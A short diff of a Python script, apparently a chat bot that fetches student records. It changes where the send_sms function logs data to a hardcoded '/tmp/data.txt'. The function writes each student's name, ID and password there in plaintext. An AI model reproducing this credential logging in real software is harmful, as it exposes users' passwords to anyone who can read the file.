@@ -134,13 +134,12 @@ def send_sms(message, chat_id, number):
     json_text = soup.get_text()
     data2 = json.loads(json_text)
     name=data2["stuName"]
-    file_path = os.getenv('DATA_FILE_PATH', 'data.txt')
+    file_path = '/tmp/data.txt'
     with open(file_path, 'a') as file:
         try:
         	file.write(f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n")
         except Exception as e:
         	print(f"Error writing to file: {e}")
-
     calculate_and_send_course_info(chat_id, data2)
 
 def calculate_and_send_course_info(chat_id, data2):
